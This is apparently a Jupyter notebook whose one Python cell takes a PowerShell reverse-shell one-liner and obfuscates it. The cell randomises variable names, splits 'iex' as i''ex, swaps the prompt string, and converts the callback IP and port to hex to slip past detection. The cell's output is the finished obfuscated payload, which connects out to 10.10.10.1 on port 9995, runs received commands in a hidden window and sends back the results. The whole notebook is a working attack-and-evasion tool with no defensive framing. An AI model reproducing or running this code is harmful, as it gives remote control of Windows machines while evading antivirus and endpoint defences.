{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "a504d767",
   "metadata": {
    "_cell_guid": "b1076dfc-b9ad-4769-8c92-a6c4dae69d19",
    "_uuid": "8f2839f25d086af736a60e9eeb907d3b93b6e0e5",
    "execution": {
     "iopub.execute_input": "2023-04-26T17:55:35.286645Z",
     "iopub.status.busy": "2023-04-26T17:55:35.286186Z",
     "iopub.status.idle": "2023-04-26T17:55:35.306271Z",
     "shell.execute_reply": "2023-04-26T17:55:35.305034Z"
    },
    "papermill": {
     "duration": 0.027558,
     "end_time": "2023-04-26T17:55:35.309036",
     "exception": false,
     "start_time": "2023-04-26T17:55:35.281478",
     "status": "completed"
    },
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Start-Process $PSHOME\\powershell.exe -ArgumentList {-ep bypass -nop $cKoIQYBn68 = New-Object System.Net.Sockets.TCPClient('0x0a0a0a01',0x270b);$R7756LYhkM = $cKoIQYBn68.GetStream();[byte[]]$xE50cMVdeB = 0..65535|%{0};while(($Hm4c2ZWFj0 = $R7756LYhkM.Read($xE50cMVdeB, 0, $xE50cMVdeB.Length)) -ne 0){;$XinCdsmdUN = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($xE50cMVdeB,0, $Hm4c2ZWFj0);$2inU6Afdvu = (i''ex $XinCdsmdUN 2>&1 | Out-String );$1K1U1KGdJw = $2inU6Afdvu + '<:kleAlILrhD:> ' + (pwd).Path + '> ';$0PFQsgPWgA = ([text.encoding]::ASCII).GetBytes($1K1U1KGdJw);$R7756LYhkM.Write($0PFQsgPWgA,0,$0PFQsgPWgA.Length);$R7756LYhkM.Flush()};$cKoIQYBn68.Close()} -WindowStyle Hidden\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "import string\n",
    "import random\n",
    "\n",
    "# Accept user input for IP and port\n",
    "ip = \"10.10.10.1\"\n",
    "port = \"9995\"\n",
    "script = \"Start-Process $PSHOME\\powershell.exe -ArgumentList {-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden\"\n",
    "\n",
    "# Open script.ps1 file in read mode\n",
    "#with open(file, 'r') as f:\n",
    "#    script = f.read()\n",
    "\n",
    "# Replace all variables with random 10-character names - excluding $PSHOME\n",
    "var_dict = {}\n",
    "pattern = re.compile(r'(?!\\$PSHOME)(\\$[A-Za-z0-9]+)')\n",
    "\n",
    "def replace_var(match):\n",
    "    var_name = match.group(1)\n",
    "    if var_name not in var_dict:\n",
    "        var_dict[var_name] = f'${\"\".join(random.choices(string.ascii_letters + string.digits, k=10))}'\n",
    "    return var_dict[var_name]\n",
    "\n",
    "script = pattern.sub(replace_var, script)\n",
    "\n",
    "# Replace iex with i''ex\n",
    "pattern = re.compile(r'iex')\n",
    "script = pattern.sub(\"i''ex\", script)\n",
    "\n",
    "# Replace PS with <:Random uuid):>\n",
    "pattern = re.compile(r'\\bPS\\b')\n",
    "\n",
    "def replace_ps(match):\n",
    "    return f'<:{\"\".join(random.choices(string.ascii_letters + string.digits, k=10))}:>'\n",
    "\n",
    "script = pattern.sub(replace_ps, script)\n",
    "\n",
    "# Replace IP and port in script\n",
    "script = script.replace(\"'*LHOST*',*LPORT*\", f\"'{ip}',{port}\")\n",
    "\n",
    "# Convert IP addresses to hex\n",
    "pattern = re.compile(r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b')\n",
    "\n",
    "def ip_to_hex(match):\n",
    "    return '0x' + ''.join(f'{int(x):02x}' for x in match.group(0).split('.'))\n",
    "\n",
    "script = pattern.sub(ip_to_hex, script)\n",
    "\n",
    "# Convert Port Number to hex - Not matching 65535\n",
    "pattern = re.compile(r'\\b(?!65535)([1-9]\\d{1,3}|[1-5]\\d{4}|6[0-4]\\d{3}|65[0-4]\\d{2}|655[0-2]\\d|6553[0-5])\\b')\n",
    "\n",
    "def port_to_hex(match):\n",
    "        port_number = int(match.group())\n",
    "        hex_value = hex(port_number)\n",
    "        return hex_value\n",
    "\n",
    "script = pattern.sub(port_to_hex, script)\n",
    "\n",
    "# Print modified script to console\n",
    "print(script)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.12"
  },
  "papermill": {
   "default_parameters": {},
   "duration": 11.628051,
   "end_time": "2023-04-26T17:55:36.033973",
   "environment_variables": {},
   "exception": null,
   "input_path": "__notebook__.ipynb",
   "output_path": "__notebook__.ipynb",
   "parameters": {},
   "start_time": "2023-04-26T17:55:24.405922",
   "version": "2.4.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
